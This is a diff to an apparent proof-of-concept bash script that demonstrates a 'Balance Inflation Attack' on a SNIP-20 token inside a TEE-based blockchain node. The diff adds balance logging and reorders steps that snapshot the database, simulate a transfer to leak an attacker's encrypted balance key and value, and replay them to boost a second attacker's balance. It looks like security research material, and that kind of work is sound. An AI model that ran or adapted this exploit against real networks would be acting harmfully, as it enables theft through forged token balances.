@@ -62,23 +62,25 @@ teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot
 teebox log "Fork()    [light_goldenrod1]# set snapshot of database ${snapshot_uniq_label}-start[/]"
 set_snapshot "${snapshot_uniq_label}-start"
 
+show_attacker_balances
 # victim is the victim
 rm -f $BACKUP/victim_key
 rm -f $BACKUP/adv_key
 rm -f $BACKUP/adv_value
+rm -f $BACKUP/kv_store
 touch $BACKUP/victim_key
 touch $BACKUP/adv_key
 touch $BACKUP/adv_value
+touch $BACKUP/kv_store
 
 # get boosting key and value
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get boosting key and value ..."
 teebox log "get boosting key and value"
-generate_and_sign_transfer ${attacker2} ${attacker1} 1 snip20_getkey
-rm -f $BACKUP/kv_store
-touch $BACKUP/kv_store
 
-teebox log "[bold]Simulate(Transfer(attacker_addr1, attacker_addr2, 1))[/]"
+teebox log "[bold]Simulate(Transfer(attacker_addr2, attacker_addr1, 1))[/]"
+generate_and_sign_transfer ${attacker2} ${attacker1} 1 snip20_getkey
 simulate_tx snip20_getkey
+show_attacker_balances
 
 res=$(cat $BACKUP/simulate_result)
 echo $res
@@ -87,17 +89,21 @@ tag=$(sed '5q;d' $BACKUP/kv_store)
 key=${tag:6:-1}
 tag=$(sed '6q;d' $BACKUP/kv_store)
 value=${tag:8:-1}
-teebox log "key=${key}"
-teebox log "value=${value}"
+teebox log "attacker addr1 balance encrypted db key=${key}"
+teebox log "attacker addr1 balance encrypted db value=${value}"
 
+teebox log "boost balance of attacker2"
 # boost balance of attacker2
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
+show_attacker_balances
 
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-boost ..."
 teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/] ${snapshot_uniq_label}-boost"
 set_snapshot "${snapshot_uniq_label}-boost"
 amount=10000
+
+show_attacker_balances
 
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start Balance Inflation Attack ..."
 for i in {1..114}; do
